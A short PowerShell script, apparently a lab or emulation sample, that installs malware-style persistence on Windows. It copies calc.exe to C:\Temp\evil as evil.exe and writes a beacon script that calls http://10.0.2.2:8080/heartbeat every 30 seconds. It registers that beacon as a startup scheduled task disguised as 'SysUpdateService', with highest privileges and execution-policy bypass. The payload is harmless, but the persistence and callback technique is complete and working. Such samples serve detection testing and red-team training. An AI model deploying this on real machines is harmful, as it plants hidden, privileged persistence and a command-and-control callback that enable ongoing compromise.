# creates C:\Temp\evil, copies calc.exe as evil.exe, registers scheduled task "SysUpdateService"
$dest = "C:\Temp\evil"
New-Item -Path $dest -ItemType Directory -Force | Out-Null
Copy-Item -Path "$env:windir\system32\calc.exe" -Destination "$dest\evil.exe" -Force
$beaconPath = "$dest\beacon.ps1"
$beaconContent = @'
while ($true) {
  try { Invoke-WebRequest -Uri "http://10.0.2.2:8080/heartbeat" -UseBasicParsing -TimeoutSec 5 } catch {}
  Start-Sleep -Seconds 30
}
'@
Set-Content -Path $beaconPath -Value $beaconContent -Force
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$beaconPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "SysUpdateService" -Action $action -Trigger $trigger -RunLevel Highest -Force
Write-Output "Persistence installed: Scheduled Task 'SysUpdateService' created. Files under $dest"
